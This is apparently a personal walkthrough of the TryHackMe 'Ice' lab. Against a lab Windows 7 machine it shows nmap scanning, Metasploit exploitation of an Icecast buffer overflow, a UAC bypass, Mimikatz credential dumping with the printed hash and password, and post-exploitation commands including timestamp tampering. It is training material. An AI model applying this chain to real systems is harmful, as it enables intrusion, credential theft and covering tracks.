# Matheus Jesus 04-04-2020

## Try Hack Me - [Ice](https://tryhackme.com/room/ice) - Continuation of Blue

### IP 10.10.180.149

#### 1. Recon - Net Scan

nmap -sV -sC -sS -oN nmap_initial 10.10.180.149

```text
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-04-04T15:24:10+00:00; -1h00m11s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

##### Port 3389 is a Microsoft Remote Desktop

##### Port 8000 running Icecast

### 2. Look for vulnerabilities on Icecast

https://www.cvedetails.com/

search for Icecast
Find list of vulnerabilities of rank **7.5**

Execute Code Overflow - CVE-2004-1561 on Metasploit

#### Mestasploit

search CVE-2004-1561
exploit/windows/http/icecast_header

set RHOSTS
exploit

### 3. Escalate Privilege

#### Meterpreter

sysinfo -> Windows build 7601
ps -> Icecast run by Dark (user)

##### Test Win x64 exploits

run post/multi/recon/local_exploit_suggester

```text
[*] 10.10.180.149 - Collecting local exploits for x86/windows...
[*] 10.10.180.149 - 30 exploit checks are being tried...
[+] 10.10.180.149 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.180.149 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

##### Back on metasploit

use exploit/windows/local/bypassuac_eventvwr
set SESSION 1

run -> it will fail to create a session

show options

SET LHOST 10.9.5.234 (VPN IP Address)

run

##### Back on Meterpreter - Escalated

getprivs -> SeTakeOwnershipPrivilege

### 4. Looting

migrate -N spoolsv.exe

Mimikats password dumping tool
load kiwi

creds_all (retrieve all credentials)

```text
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

### 5. Post-Exploitation

help -> on Meterpreter

hashdump -> get all password hashes
screenshare -> watch screen
timestopm -> change timestamp of files

Access Remote Desktop with Remmina

### Exploiting without Metasploit

https://www.exploit-db.com/exploits/568

DONE!
